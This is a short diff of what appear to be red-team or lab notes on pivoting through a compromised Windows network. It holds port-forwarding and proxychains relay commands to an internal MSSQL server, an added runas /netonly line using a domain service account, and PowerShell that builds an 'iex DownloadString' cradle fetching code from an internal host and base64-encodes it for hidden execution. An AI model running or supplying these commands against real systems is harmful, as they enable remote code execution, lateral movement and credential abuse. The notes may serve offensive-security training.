@@ -19,7 +19,7 @@ socks 1080
 rportfwd 8080 192.168.100.166 443
 
 proxychains socat TCP4-Listen:1433,fork TCP:10.10.120.20:1433
-
+runas /netonly /user:CYBER\svc_mssql "C:\Program Files\HeidiSQL\heidisql.exe"
 PS C:\Users\Commando> $OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://wkstn-1555:8080/a')"
 PS C:\Users\Commando> [System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))
 
